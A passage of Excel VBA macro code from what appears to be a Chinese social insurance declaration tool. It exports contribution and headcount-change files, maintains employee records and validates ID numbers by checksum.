            ActiveWorkbook.Sheets(1).Cells(1, 15) = "征收品目"   '生育保险 20080529 yh add.
            ActiveWorkbook.Sheets(1).Cells(1, 16) = "计费金额"
           
            ActiveWorkbook.Sheets(1).Cells(1, 17) = "征收品目"   '生育保险 20080529 yh add.
            ActiveWorkbook.Sheets(1).Cells(1, 18) = "计费金额"
            k = 1
    For i = iCount To 3 Step -1
                  
               If nDate = ThisWorkbook.Sheets("历史数据").Cells(i, 47) Then
  

                  k = k + 1
                      If ThisWorkbook.Sheets("历史数据").Cells(i, 10) = "在职" Then
                          s = s + 1
                      Else
                          m = m + 1
                      End If

                     
                     
                     
                  
                  ActiveWorkbook.Sheets(1).Cells(k, 1) = ThisWorkbook.Sheets("历史数据").Cells(i, 3) '"姓名"
                  ActiveWorkbook.Sheets(1).Cells(k, 2) = ThisWorkbook.Sheets("历史数据").Cells(i, 4) '"身份证明号码"
                  ActiveWorkbook.Sheets(1).Cells(k, 3) = ThisWorkbook.Sheets("历史数据").Cells(i, 2) '"个人社保号 "
                  ActiveWorkbook.Sheets(1).Cells(k, 4) = ThisWorkbook.Sheets("历史数据").Cells(i, 11) '"工资薪金"
                  u = 0
                  For j = 12 To 42 Step 5
                  
                  If ThisWorkbook.Sheets("历史数据").Cells(i, j) <> "" Then
                   ActiveWorkbook.Sheets(1).Cells(k, 5 + 2 * u) = ThisWorkbook.Sheets("历史数据").Cells(i, j)
                   ActiveWorkbook.Sheets(1).Cells(k, 5 + 2 * u + 1) = ThisWorkbook.Sheets("历史数据").Cells(i, j + 2)
   
                      
                      u = u + 1
                      End If
                      Next j
                    
              
                    
                 
                  
                  End If
                    
              Bili = (iCount - i + 1) / (iCount - 2) * 100
                  Application.StatusBar = "正在导出报盘文件....." & Trim(Str(Int(Bili))) & "%"
                    
                Next i
           
             
              
     
    Else  '网上申报-代码结束
       If sb_mode = "上门申报" Then
       
    
 
    '上门申报－磁盘申报格式：
    '变动类型    个人参保号  姓名 身份证号码  身份证明类别    人员状态    人员类别    用工形式    户籍类型    性别    工资薪金    征收品目    缴费基数
    ActiveWorkbook.Sheets(1).Cells(1, 1) = "变动类型"
    ActiveWorkbook.Sheets(1).Cells(1, 2) = "个人参保号"
    ActiveWorkbook.Sheets(1).Cells(1, 3) = "姓名"
    ActiveWorkbook.Sheets(1).Cells(1, 4) = "身份证号码"
    ActiveWorkbook.Sheets(1).Cells(1, 5) = "身份证明类别"
    ActiveWorkbook.Sheets(1).Cells(1, 6) = "人员状态"
    ActiveWorkbook.Sheets(1).Cells(1, 7) = "人员类别"
    ActiveWorkbook.Sheets(1).Cells(1, 8) = "用工形式"
    ActiveWorkbook.Sheets(1).Cells(1, 9) = "户籍类型"
    ActiveWorkbook.Sheets(1).Cells(1, 10) = "性别"
    ActiveWorkbook.Sheets(1).Cells(1, 11) = "工资薪金"
    ActiveWorkbook.Sheets(1).Cells(1, 12) = "征收品目"
    ActiveWorkbook.Sheets(1).Cells(1, 13) = "缴费基数"
    
    k = 1
      For i = iCount To 3 Step -1
  
           If nDate = ThisWorkbook.Sheets("历史数据").Cells(i, 47) Then

         
                      If ThisWorkbook.Sheets("历史数据").Cells(i, 10) = "在职" Then
                          s = s + 1
                      Else
                          m = m + 1
                      End If
    
    
        For j = 12 To 42 Step 5
       If ThisWorkbook.Sheets("历史数据").Cells(i, j) <> "" Then
              k = k + 1
    
      ActiveWorkbook.Sheets(1).Cells(k, 1) = "1"
       
       ActiveWorkbook.Sheets(1).Cells(k, 12) = ThisWorkbook.Sheets("历史数据").Cells(i, j)

      ActiveWorkbook.Sheets(1).Cells(k, 13) = ThisWorkbook.Sheets("历史数据").Cells(i, 11)
   
         
       For h = 1 To 50
                      
                      If ThisWorkbook.Sheets("历史数据").Cells(i, j) = PM_dm(h) And ThisWorkbook.Sheets("历史数据").Cells(i, 11) > Js_sx(h) Then
                      
                         ActiveWorkbook.Sheets(1).Cells(k, 13) = Js_sx(h)
                         
                         Exit For
                         End If
                         
                         
                       If ThisWorkbook.Sheets("历史数据").Cells(i, j) = PM_dm(h) And ThisWorkbook.Sheets("历史数据").Cells(i, 11) < Js_xx(h) Then
                      
                          ActiveWorkbook.Sheets(1).Cells(k, 13) = Js_xx(h)
                         
                          Exit For
                         End If
                                                
                         
                         
                      Next h
       
       
       
       
       For h = 2 To 11
            
            
            If h <= 4 Then
             ActiveWorkbook.Sheets(1).Cells(k, h) = ThisWorkbook.Sheets("历史数据").Cells(i, h)
            End If
             
            If 4 < h And h < 11 Then
            For L = 1 To 10
                If MandD(L, (h - 4) * 2) = ThisWorkbook.Sheets("历史数据").Cells(i, h) Then
                 ActiveWorkbook.Sheets(1).Cells(k, h) = MandD(L, (h - 4) * 2 - 1)
                 Exit For
                End If
             Next L
                  
             End If
             
             
             
             If h = 11 Then
               ActiveWorkbook.Sheets(1).Cells(k, h) = ThisWorkbook.Sheets("历史数据").Cells(i, h)
             End If
        
       
       
       Next h
       GuoDu = ActiveWorkbook.Sheets(1).Cells(k, 6)
        ActiveWorkbook.Sheets(1).Cells(k, 6) = ActiveWorkbook.Sheets(1).Cells(k, 10)
        ActiveWorkbook.Sheets(1).Cells(k, 10) = GuoDu
       
       End If
        
            
       
       Next j
       
       
       
       
      
                     
    End If
    Bili = (iCount - i + 1) / (iCount - 2) * 100
      Application.StatusBar = "正在导出报盘文件....." & Trim(Str(Int(Bili))) & "%"
    
    Next i
    
       
  End If

End If

   If k - 1 = 0 Then
    MsgBox "未有该期缴费数据,请先生成..."
   GoTo ErrorHandler:
   End If
   
   nFileName = "记录" + Trim(Str(k - 1)) + "条" + nFileName
   
   On Error GoTo ErrorHandler
    
   newbook.SaveAs Filename:=nFileName
   
   
     Workbooks(nFileName).Close
    
       MsgBox ("已生成磁盘文件：" + nFileName + "，文件存放在与本工具相同的文件夹内。" + "本月磁盘申报计" + Str(s + m) + "人(申报缴费记录：" + Str(k - 1) + "），计在职参保人数：" + Str(s) + "人，退休参保人数：" + Str(m) + "。 请核对！")
   
 
'    MsgBox ("已生成磁盘申报文件：" + nFileName + "，文件存放在与ss.xls相同的文件夹内。" + "本月磁盘申报计" + Str(s + m) + "人(申报缴费记录：" + Str(k - 2) + "），计在职参保人数：" + Str(s) + "人，退休参保人数：" + Str(m) + "。 请核对！")
    
     
    

    ActiveSheet.Protect  '保护工作表
   
    Sheets("历史数据").Protect  '恢复保护工作表
    
    
    Application.ScreenUpdating = True
   '恢复屏幕更新
    Sheets("历史数据").Protect  '恢复保护工作表

    Sheets("主页").Select  '恢复保护工作表
     Application.EnableEvents = True
      Application.ScreenUpdating = True  '恢复屏幕更新
     Application.StatusBar = False
    ThisWorkbook.Save
    Exit Sub
     
     
ErrorHandler:                ' 错误处理程序。
   
     Application.EnableEvents = True
      Application.ScreenUpdating = True  '恢复屏幕更新
     Application.StatusBar = False
   ActiveWorkbook.Saved = True
   ActiveWorkbook.Close
  
End Sub

Private Sub 生成缴费数据_Click()
Dim iCount, iCount1, Baozhi As Integer

 Dim Bili, Fdw, Fgr As Double

    Dim nChoice As Variant '操作选项

Dim i, j, k, L, m, s, Js, js_1, dm, dm_1, h, zeng, jian, u, D_riqi, J_riqi, Rq, Hang As Integer
 
 
    调代码表

 
 nYear = Trim(Str(Sheets("主页").Cells(3, 5))) & "年" '年
    nMonth = Str(Sheets("主页").Cells(3, 6)) & "月" '月
    'nDate = nYear + nMonth
    Shenbq.Show
    If Shenbq.rh.Value = "" Then
    Exit Sub
    End If
    
    nDate = Shenbq.rh.Value + "年 " + Shenbq.ee.Value + "月"
    
 
  Application.EnableEvents = False
     Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表
     Sheets("历史数据").Unprotect  '撤销保护工作表
 
  
 iCount = Sheets("个人明细").[a2].CurrentRegion.Rows.Count
    If iCount < 3 And ThisWorkbook.Sheets("个人明细").Cells(3, 4) = "" Then
        MsgBox ("未有参保记录")
        Exit Sub '返回
    End If
         iCount1 = Sheets("历史数据").[a2].CurrentRegion.Rows.Count
      
      Baozhi = 0
      For i = iCount1 To 3 Step -1
            If nDate = Sheets("历史数据").Cells(i, 47) Then
              Baozhi = 1
              Exit For
            End If
      Next i

      
      If Baozhi = 1 Then
      nChoice = MsgBox("所属期为" + nDate + "的数据已生成！重新生成须删除旧的数据,是否重新生成？", 1, "社保费申报工具") '返回值确定1，取消2
      If nChoice = 2 Then
      Application.EnableEvents = True
      Exit Sub
      End If
      
      If nChoice = 1 Then
       Sheets("历史数据").Select
       'Sheets("历史数据").Unprotect  '撤销保护工作表
       ThisWorkbook.Sheets("历史数据").Unprotect    '  20070716 yh. update  该语句不可少，否则会出错。
       Application.StatusBar = "正在清除已生成的申报数据....."
          
         For i = iCount1 To 3 Step -1
                    
            If nDate = Sheets("历史数据").Cells(i, 47) Then
            ThisWorkbook.Sheets("历史数据").Rows(i).Delete
            End If
        
         

         Next i
      End If
   
   End If
 
 
 
 Application.StatusBar = "正在删除上月已减人员....."
If Len(nDate) = 9 Then

D_riqi = Left(nDate, 4) * 100 + Mid(nDate, 7, 2)
Else
D_riqi = Left(nDate, 4) * 100 + Mid(nDate, 7, 1)

End If
'Sheets("主页").Cells(31, 1) = D_riqi


h = 3
For i = 3 To iCount

    If Len(Sheets("个人明细").Cells(h, 19)) = 9 Then
      J_riqi = Left(Sheets("个人明细").Cells(h, 19), 4) * 100 + Mid(Sheets("个人明细").Cells(h, 19), 7, 2)
    Else
      J_riqi = Left(Sheets("个人明细").Cells(h, 19), 4) * 100 + Mid(Sheets("个人明细").Cells(h, 19), 7, 1)
    End If
    'Sheets("主页").Cells(32, 1) = J_riqi
    If J_riqi < D_riqi And Sheets("个人明细").Cells(h, 1) = "增员" Then
      Sheets("个人明细").Cells(h, 1) = "正常"
    End If
    If J_riqi < D_riqi And Sheets("个人明细").Cells(h, 1) = "减员" Then
             ThisWorkbook.Sheets("个人明细").Rows(h).Delete
             h = h - 1
    End If
   h = h + 1
    
Next i

 iCount = Sheets("个人明细").[a2].CurrentRegion.Rows.Count
     iCount1 = Sheets("历史数据").[a2].CurrentRegion.Rows.Count
     k = iCount1
     
      
     Application.StatusBar = "正在生成缴费数据....."
     For i = 3 To iCount
     
     
     If Sheets("个人明细").Cells(i, 1) <> "减员" Then
     
     k = k + 1
     For j = 1 To 11
     Sheets("历史数据").Cells(k, j) = Sheets("个人明细").Cells(i, j)
     Next j
     Sheets("历史数据").Cells(k, 47) = nDate
     Sheets("历史数据").Cells(k, 48) = Sheets("主页").Cells(3, 11)
     Sheets("历史数据").Cells(k, 49) = Sheets("个人明细").Cells(i, 22)
     Sheets("历史数据").Cells(k, 50) = Sheets("个人明细").Cells(i, 23)
     
    
         
     
     
     For j = 12 To 18
     
     Sheets("历史数据").Cells(k, 12 + 5 * (j - 12)) = Sheets("个人明细").Cells(i, j)
     For h = 1 To 50
        If Sheets("个人明细").Cells(i, j) = PM_dm(h) Then
        
        Sheets("历史数据").Cells(k, 13 + 5 * (j - 12)) = PM_mc(h)
        Sheets("历史数据").Cells(k, 14 + 5 * (j - 12)) = Sheets("历史数据").Cells(k, 11)
          
          If Sheets("历史数据").Cells(k, 11) > Js_sx(h) Then
             Sheets("历史数据").Cells(k, 14 + 5 * (j - 12)) = Js_sx(h)
          End If
          
          If Sheets("历史数据").Cells(k, 11) < Js_xx(h) Then
             Sheets("历史数据").Cells(k, 14 + 5 * (j - 12)) = Js_xx(h)
          End If
          
          'If j = 12 Then
          'Sheets("历史数据").Cells(K, 15 + 5 * (j - 12)) = Round(Sheets("历史数据").Cells(K, 14 + 5 * (j - 12)) * Sheets("代码表").Cells(h, 3), 0)
          'Sheets("历史数据").Cells(K, 16 + 5 * (j - 12)) = Round(Sheets("历史数据").Cells(K, 14 + 5 * (j - 12)) * Sheets("代码表").Cells(h, 4), 0)
          'Exit For
          'Else
                    
         Sheets("历史数据").Cells(k, 15 + 5 * (j - 12)) = Sheets("历史数据").Cells(k, 14 + 5 * (j - 12)) * Flv_dw(h)
         Sheets("历史数据").Cells(k, 51) = Flv_dw(h)
         Sheets("历史数据").Cells(k, 15 + 5 * (j - 12)).FormulaR1C1 = "=ROUND(RC[-1]*RC51,2)"
         Fdw = Sheets("历史数据").Cells(k, 15 + 5 * (j - 12))
         Sheets("历史数据").Cells(k, 15 + 5 * (j - 12)) = Fdw
         
         Sheets("历史数据").Cells(k, 16 + 5 * (j - 12)) = Sheets("历史数据").Cells(k, 14 + 5 * (j - 12)) * Flv_gr(h)
         Sheets("历史数据").Cells(k, 51) = Flv_gr(h)
          Sheets("历史数据").Cells(k, 16 + 5 * (j - 12)).FormulaR1C1 = "=ROUND(RC[-2]*RC51,2)"
         Fgr = Sheets("历史数据").Cells(k, 16 + 5 * (j - 12))
         Sheets("历史数据").Cells(k, 16 + 5 * (j - 12)) = Fgr
         Sheets("历史数据").Cells(k, 51) = ""
       Exit For
        'End If
        End If
     Next h
           
     
     Next j
     
     End If
     Bili = (i - 2) / (iCount - 2) * 100
    Application.StatusBar = "正在生成缴费数据....." & Trim(Str(Int(Bili))) & "%"
     Next i
     
     
     调代码表
         MsgBox ("数据已生成！")


ActiveSheet.Protect  '保护工作表
   
    Sheets("个人明细").Protect  '恢复保护工作表
    
    
    Application.ScreenUpdating = True
   '恢复屏幕更新
    Sheets("历史数据").Protect  '恢复保护工作表

    Sheets("主页").Select  '恢复保护工作表
     Application.EnableEvents = True
      Application.ScreenUpdating = True  '恢复屏幕更新
     Application.StatusBar = False
    ThisWorkbook.Save
    Exit Sub
     

End Sub

Private Sub 始_Click()
id_ms = 3
id_ls = 3
Call 显示记录

End Sub

Private Sub 跳转_Click()
id_ms = Sheets("主页").Cells(20, 3) + 2
id_ls = Sheets("主页").Cells(20, 3) + 2
Call 显示记录

End Sub

Private Sub 退_Click()
id_ms = Sheets("主页").Cells(20, 3) + 2 - 1
id_ls = Sheets("主页").Cells(20, 3) + 2 - 1
Call 显示记录
End Sub

Private Sub 退出_Click()
ThisWorkbook.Save

ThisWorkbook.Close
End Sub

Private Sub 修改_Click()
Dim i, j, m, iCount, n, Nn As Integer '定义用于循环的整型变量
Dim nDate, nYear, nMonth, xgnr, Sfzeng As String
Dim nChoice As Variant '操作选项

 On Error GoTo ErrorHandler


If Renybj.Value = False Then

  MsgBox ("窗口未设为人员管理状态!")
  Exit Sub
End If
      If Sheet1.Cells(10, 3) = "" And Sheet1.Cells(10, 4) = "" Then
         MsgBox ("无修改人员数据!")
      Exit Sub
      End If
      
If sj = 1 Then
  MsgBox ("这是缴费数据，不能修改!")
  Exit Sub
End If

If Sheets("个人明细").Cells(id_ms, 1) = "减员" Then
  MsgBox ("这是已减人员，不能修改!")
  Exit Sub
End If


nChoice = MsgBox("确定修改吗？", 1, "提示") '返回值确定1，取消2
      If nChoice = 2 Then
       Exit Sub
      End If
      
      Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
    Sheets("个人明细").Unprotect  '撤销保护工作表
    Sheets("代码表").Unprotect  '撤销保护工作表
    Sheets("个人明细").Select

    Application.EnableEvents = False '防止系统事件误击发
nYear = Trim(Str(ThisWorkbook.Sheets("主页").Cells(3, 5))) & "年"
nMonth = Str(ThisWorkbook.Sheets("主页").Cells(3, 6)) & "月"
nDate = nYear + nMonth
xgnr = ""
 
     iCount = Sheets("代码表").[a1].CurrentRegion.Rows.Count + 1
     
     
                 If Sheets("主页").Cells(10, 4) <> Sheets("个人明细").Cells(id_ms, 4) Then
                 
                 
                 
                  Sfzeng = Sheets("主页").Cells(10, 4)
  Sheets("主页").Cells(10, 4) = SfzHm(Sheets("主页").Cells(10, 4))
  If Sheets("主页").Cells(10, 4) = "" Then
     Sheets("主页").Cells(10, 4) = Sfzeng
      Sheets("主页").Select
       Application.EnableEvents = True
     Exit Sub
   End If
     
   
             If Len(Sfzeng) = 18 Then
             Nn = Mid(Sfzeng, 17, 1)
          ElseIf Len(Sfzeng) = 15 Then
             Nn = Right(Sfzeng, 1)
          End If

            If Int(Nn / 2) = Nn / 2 And Sheets("主页").Cells(10, 6) = "男" Then
                 MsgBox "请核准身份证号码或姓别..."
                      Sheets("主页").Cells(10, 4) = Sfzeng
                       Sheets("主页").Select
                       Application.EnableEvents = True
                Exit Sub
            ElseIf Int(Nn / 2) <> Nn / 2 And Sheets("主页").Cells(10, 6) = "女" Then
                 MsgBox "请核准身份证号码或姓别..."
                      Sheets("主页").Cells(10, 4) = Sfzeng
                       Sheets("主页").Select
                       Application.EnableEvents = True
                 Exit Sub
            End If
                 
                 

                 nChoice = MsgBox("个人身份证己修改,是否同时变更个人社保号？", 1, "社保费申报工具")
                   If nChoice = 1 Then
                       Sheets("主页").Unprotect  '撤销保护工作表
                        Sheets("主页").Cells(10, 2) = Sheets("主页").Cells(10, 4)
                        Sheets("主页").Protect
                    End If
                       
                 End If






   
     For j = 2 To 11
            
                 If Sheets("个人明细").Cells(id_ms, j) <> Sheets("主页").Cells(10, j) Then

                 Sheets("个人明细").Cells(id_ms, j) = Sheets("主页").Cells(10, j)
                 xgnr = xgnr + Sheets("个人明细").Cells(2, j)
                 
                 End If

     Next
     
     For j = 13 To 19
            
    
    For m = 3 To iCount
    
       
        If Sheets("主页").Cells(j, 3) = Sheets("代码表").Cells(m, 2) And Sheets("个人明细").Cells(id_ms, j - 1) <> Sheets("代码表").Cells(m, 1) Then
        
                        
            Sheets("个人明细").Cells(id_ms, j - 1) = Sheets("代码表").Cells(m, 1)
            xgnr = xgnr + Sheets("个人明细").Cells(2, j - 1)
            
            
            Exit For
        End If
    Next m
    Next j
    
      
      If Sheets("个人明细").Cells(id_ms, 22) <> Sheets("主页").Cells(13, 11) Then
            Sheets("个人明细").Cells(id_ms, 22) = Sheets("主页").Cells(13, 11)
            xgnr = xgnr + Sheets("个人明细").Cells(2, 22)
      End If
      
       If Sheets("个人明细").Cells(id_ms, 23) <> Sheets("主页").Cells(15, 11) Then
            Sheets("个人明细").Cells(id_ms, 23) = Sheets("主页").Cells(15, 11)
            xgnr = xgnr + Sheets("个人明细").Cells(2, 23)
      End If
      
     
     If Sheets("个人明细").Cells(id_ms, 1) = "正常" And xgnr <> "" Then
               
            If Sheets("个人明细").Cells(id_ms, 20) = nDate Then
                Sheets("个人明细").Cells(id_ms, 21) = Sheets("个人明细").Cells(id_ms, 21) + xgnr
            Else
               Sheets("个人明细").Cells(id_ms, 20) = nDate
               Sheets("个人明细").Cells(id_ms, 21) = xgnr
            End If
            
     End If
    
        
  ThisWorkbook.Save


    Call 显示记录
    
ErrorHandler:                ' 错误处理程序。

    Application.ScreenUpdating = True
   '恢复屏幕更新
    Sheets("个人明细").Protect  '恢复保护工作表
    Sheets("主页").Select
    Application.EnableEvents = True '防止系统事件误击发


End Sub

Private Sub 增减员申报_Click()
    Dim nFileName, Thisname As String '文件名
    Dim i, j, k, L, m, s, Js, js_1, dm, dm_1, h, zeng, jian, u, D_riqi, J_riqi, Hang As Integer
    Dim allDir As String
    Dim iCount, iCount1 As Integer
    Dim wb As Object
    Dim ls_data As String
    Dim t_number As Integer '作为每个参保人的第
    
    Dim nChoice As Variant '操作选项
    Dim newbook As Object
    
    Dim Bili As Double
    
    
    
    If PM_mc(1) = "" Then
    调代码表
    End If
    Thisname = ThisWorkbook.Name
                 
    sb_mode = ""
    Uf_ts.Show
    If Uf_ts.sb_s.Value = True Then
        sb_mode = "上门申报"
    End If
    If Uf_ts.sb_w.Value = True Then
       sb_mode = "网上申报"
    End If
    If sb_mode = "" Then
    MsgBox "未选择申报方式,请重新申报..."
    Exit Sub
    End If
   Application.StatusBar = "正在导出增减员报盘文件....."

    nYear = Trim(Str(Sheets("主页").Cells(3, 5))) & "年" '年
    nMonth = Str(Sheets("主页").Cells(3, 6)) & "月" '月
    nDate = nYear + nMonth
    
   
    allDir = ThisWorkbook.Path  '切换到ss.xls当前路径
    ChDrive Trim(Left(allDir, 1))  '改变默认驱动器
    ChDir allDir  '改变默认路径
    'MsgBox CurDir()
     Application.EnableEvents = False
     Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表
       
    
    nFileName = sb_mode + Trim(nDate) + Trim(Sheets("主页").Cells(5, 3)) + ".xls"
    '文件名规则：单位名称+社保个人明细申报＋年＋月

On Error GoTo ErrorHandler
    '打开文件错误定义
    Set newbook = Workbooks.Add
    
    ActiveWorkbook.Sheets(1).Columns("A:J").Select
    Selection.NumberFormatLocal = "@"
    
    iCount = ThisWorkbook.Sheets("个人明细").[a2].CurrentRegion.Rows.Count
        
    For j = 1 To 10  '复制（第一行）字段名
        If j <> 6 Or j <> 10 Then  '由于格式有误，故将字段“性别”（6）与“人员状态”（10） 对调。20070710 yh. update
           ActiveWorkbook.Sheets(1).Cells(1, j) = ThisWorkbook.Sheets("个人明细").Cells(2, j)
           ' 将ss.xls 的第二张表的内容复制到报盘文件的第一张表。
        End If
    Next j
    '由于格式有误，故将字段“性别”（6）与“人员状态”（10） 对调。20070710 yh. update
        
    ActiveWorkbook.Sheets(1).Cells(1, 6) = ThisWorkbook.Sheets("个人明细").Cells(2, 10)
    ActiveWorkbook.Sheets(1).Cells(1, 10) = ThisWorkbook.Sheets("个人明细").Cells(2, 6)
    
        If sb_mode = "网上申报" Then
               ActiveWorkbook.Sheets(1).Cells(1, 7) = ThisWorkbook.Sheets("个人明细").Cells(2, 9)
               ActiveWorkbook.Sheets(1).Cells(1, 9) = ThisWorkbook.Sheets("个人明细").Cells(2, 7)
          End If
         
   

    zeng = 0  '增
    jian = 0  '减
    Hang = 2
    
    For i = 3 To iCount
    
        If (ThisWorkbook.Sheets("个人明细").Cells(i, 1) = "减员" Or ThisWorkbook.Sheets("个人明细").Cells(i, 1) = "增员") And ThisWorkbook.Sheets("个人明细").Cells(i, 19) = nDate Then 'And ThisWorkbook.Sheets("个人明细").Cells(i, 19) = nDate Then   当前变更日期才能导出个人明细记录 20080603 yh update.
             
           For h = 1 To 10
               If MandD(h, 14) = ThisWorkbook.Sheets("个人明细").Cells(i, 1) Then
                 ActiveWorkbook.Sheets(1).Cells(Hang, 1) = MandD(h, 13)
                 Exit For
                End If
             Next h
                         
             
           For j = 2 To 10
                       
           If 2 <= j <= 4 Then
           
           ActiveWorkbook.Sheets(1).Cells(Hang, j) = ThisWorkbook.Sheets("个人明细").Cells(i, j)
           
           End If
           
           If j >= 5 Then
             For h = 1 To 10
                If MandD(h, 2 * (j - 4)) = ThisWorkbook.Sheets("个人明细").Cells(i, j) Then
                 ActiveWorkbook.Sheets(1).Cells(Hang, j) = MandD(h, 2 * (j - 4) - 1)
                     If sb_mode = "网上申报" And j = 6 Then
                     ActiveWorkbook.Sheets(1).Cells(Hang, j) = MandD(h, 15)
                     End If
                 Exit For
                End If
             Next h
             End If
            
        Next j
       GuoDu = ActiveWorkbook.Sheets(1).Cells(Hang, 6)
       ActiveWorkbook.Sheets(1).Cells(Hang, 6) = ActiveWorkbook.Sheets(1).Cells(Hang, 10)
       ActiveWorkbook.Sheets(1).Cells(Hang, 10) = GuoDu
       If sb_mode = "网上申报" Then
        GuoDu = ActiveWorkbook.Sheets(1).Cells(Hang, 7)
       ActiveWorkbook.Sheets(1).Cells(Hang, 7) = ActiveWorkbook.Sheets(1).Cells(Hang, 9)
       ActiveWorkbook.Sheets(1).Cells(Hang, 9) = GuoDu
      End If
        
        Hang = Hang + 1
        
        If ThisWorkbook.Sheets("个人明细").Cells(i, 1) = "增员" Then
              zeng = zeng + 1
            End If
            
          If ThisWorkbook.Sheets("个人明细").Cells(i, 1) = "减员" Then
              jian = jian + 1
          End If
        
       End If
       Bili = (i - 2) / (iCount - 2) * 100
       Application.StatusBar = "正在导出增减员报盘文件....." & Trim(Str(Int(Bili))) & "%"
        Next i
        i = zeng + jian
        
   If i = 0 Then
   ActiveWorkbook.Saved = True
   ActiveWorkbook.Close
   MsgBox ("本月没有增减员，不用申报增减员，请核对！")
   Else
   
    nFileName = "社保增减员" + Trim(Str(i)) + "人_" + nFileName
    
    ActiveWorkbook.SaveAs Filename:=nFileName
    
    Workbooks(nFileName).Close
   

    MsgBox ("已生成增减员报盘文件：" + nFileName + "。文件存放在与申报工具相同的文件夹内。" + " 本月增员" + Str(zeng) + "人，减员" + Str(jian) + "人，请核对！")
    End If
    Application.StatusBar = False
    Application.EnableEvents = True
    Application.ScreenUpdating = False


ErrorHandler:
If ActiveWorkbook.Name <> Thisname Then
 ActiveWorkbook.Saved = True
   ActiveWorkbook.Close
       Application.StatusBar = False
    Application.EnableEvents = True
    Application.ScreenUpdating = False

 End If
'－－－－－－－－－－－－－导出磁盘申报个人明细文件ok!

End Sub

Private Sub 增员_Click()
Dim i, j, m, iCount, Nn As Integer '定义用于循环的整型变量
Dim nDate, nYear, nMonth, Sfzeng As String
Dim nChoice As Variant '操作选项


 For i = 3 To 10
 If Sheets("主页").Cells(10, i) = "" Then
    MsgBox "个人资料不完整，请补录..."
    Exit Sub
 End If

Next i
  Sfzeng = Sheets("主页").Cells(10, 4)
  Sheets("主页").Cells(10, 4) = SfzHm(Sheets("主页").Cells(10, 4))
  If Sheets("主页").Cells(10, 4) = "" Then
     Sheets("主页").Cells(10, 4) = Sfzeng
     MsgBox "请核准身份证号码,改正后再增员..."
     Exit Sub
   End If
     
   
             If Len(Sfzeng) = 18 Then
             Nn = Mid(Sfzeng, 17, 1)
          ElseIf Len(Sfzeng) = 15 Then
             Nn = Right(Sfzeng, 1)
          End If

            If Int(Nn / 2) = Nn / 2 And Sheets("主页").Cells(10, 6) = "男" Then
                 MsgBox "请核准身份证号码或姓别..."
                      Sheets("主页").Cells(10, 4) = Sfzeng

                Exit Sub
            ElseIf Int(Nn / 2) <> Nn / 2 And Sheets("主页").Cells(10, 6) = "女" Then
                 MsgBox "请核准身份证号码或姓别..."
                      Sheets("主页").Cells(10, 4) = Sfzeng

                 Exit Sub
            End If
   
  
nChoice = MsgBox("已核准资料,确定是增员吗？", 1, "社保费申报工具") '返回值确定1，取消2
      If nChoice = 2 Then
      Sheets("主页").Cells(10, 4) = Sfzeng
       Exit Sub
      End If


 nYear = Trim(Str(ThisWorkbook.Sheets("主页").Cells(3, 5))) & "年"
 nMonth = Str(ThisWorkbook.Sheets("主页").Cells(3, 6)) & "月"
 nDate = nYear + nMonth
 Application.EnableEvents = False '防止系统事件误击发
 Application.ScreenUpdating = False '取消屏幕更新
   

       Sheets("个人明细").Unprotect  '撤销保护工作表
       Sheets("代码表").Unprotect  '撤销保护工作表
       Sheets("主页").Unprotect

       
       
       
     i = Sheets("个人明细").[a1].CurrentRegion.Rows.Count + 1
     'iCount = Sheets("代码表").[A1].CurrentRegion.Rows.Count
     Sheets("主页").Cells(10, 2) = Sheets("主页").Cells(10, 4)
     Sheets("个人明细").Cells(i, 1) = "增员"
     Sheets("个人明细").Cells(i, 19) = nDate
     Sheets("个人明细").Cells(i, 22) = Sheets("主页").Cells(13, 11)
     Sheets("个人明细").Cells(i, 23) = Sheets("主页").Cells(15, 11)

     
   
     For j = 2 To 11
         Sheets("个人明细").Cells(i, j) = Sheets("主页").Cells(10, j)
     Next
     
     For j = 13 To 19
    
    'For m = 3 To iCount
       
        
        'If Sheets("主页").Cells(j, 3) = Sheets("代码表").Cells(m, 2) Then
            
           ' Sheets("个人明细").Cells(i, j - 1) = Sheets("代码表").Cells(m, 1)
           
          For m = 1 To 50
          
            If Sheets("主页").Cells(j, 3) = PM_mc(m) Then
            
           Sheets("个人明细").Cells(i, j - 1) = PM_dm(m)
            
            Exit For
        End If
    Next m
    Next j
    
    id_ms = i
    Call 显示记录
    
  ThisWorkbook.Save
  
     
    ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
    Sheets("个人明细").Protect  '恢复保护工作表
    Sheets("主页").Protect  '恢复保护工作表

  
End Sub

Function SfzHm(zHao) As String '身份证号码校验
On Error Resume Next
Dim wi As Variant, Ji As Variant, sum%, i%, intMsg%
wi = Array(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2)
Ji = Array("1", "0", "X", "9", "8", "7", "6", "5", "4", "3", "2")
sum = 0
If Len(zHao) = 15 Then
 If Not IsNumeric(zHao) Then
  MsgBox "15位身份证号中有非法字符！"
  Exit Function
 End If
 zHao = Left(zHao, 6) & "19" & Right(zHao, 9)
ElseIf Len(zHao) = 18 Then
 If Not (IsNumeric(Mid(zHao, 1, 17)) And (IsNumeric(Right(zHao, 1)) Or Right(zHao, 1) = "X" Or Right(zHao, 1) = "x")) Then
  MsgBox "18位身份证号中有非法字符！"
  Exit Function
 End If
Else
 MsgBox "身份证号码位数不对，请检查！"
 Exit Function
End If
If IsError(DateValue(Mid(zHao, 7, 4) & "-" & Mid(zHao, 11, 2) & "-" & Mid(zHao, 13, 2))) Or Val(Mid(zHao, 7, 4)) > Year(Date) Or Val(Mid(zHao, 7, 4)) < Year(Date) - 200 Then
 MsgBox "身份证号中日期信息有误！"
 Exit Function
End If

For i = 0 To UBound(wi)
 sum = sum + Mid(zHao, i + 1, 1) * wi(i)
Next i

If Len(zHao) = 17 Then
 SfzHm = zHao & Ji(sum Mod 11)
Else
 If Ji(sum Mod 11) <> Right(zHao, 1) Then
  intMsg = MsgBox("身份证号码校验码错误！" & vbCrLf & "您要输入的是：" & Mid(zHao, 1, 17) & Ji(sum Mod 11) & "吗？请确认...", vbYesNo)
  If intMsg = vbYes Then
   SfzHm = Mid(zHao, 1, 17) & Ji(sum Mod 11)
  Else
   Exit Function
  End If
 Else
  SfzHm = zHao
 End If
